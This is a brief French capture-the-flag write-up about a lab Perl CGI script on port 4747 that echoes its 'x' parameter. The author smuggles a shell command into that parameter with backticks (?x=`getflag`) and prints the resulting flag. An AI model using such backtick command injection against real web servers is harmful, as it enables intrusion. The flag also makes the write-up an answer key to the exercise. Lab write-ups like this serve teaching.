# Explications
Il y a un script perl![enter image description here](https://i.imgur.com/nW9vGrf.png)
On voit que c'est un script qui s'execute en arriere-plan et qui est accessible depuis un site web(localhost:4747).
CGI Permet d'executer des programmes externe depuis un serveur web.
On va utiliser ca pour appeler getflag.
En allant sur http://192.168.1.10:4747, on accède bien au site.

Sur le script,ca demande un parametre x.

`http://192.168.1.10:4747/?x=42` affiche bien 42.

`http://192.168.1.10:4747/?x=getflag` affiche getflag

en echappant getflag avec des back-quotes 

	http://192.168.1.10:4747/?x=`getflag`
On a notre flag: ne2searoevaevoem4ov4ar8ap 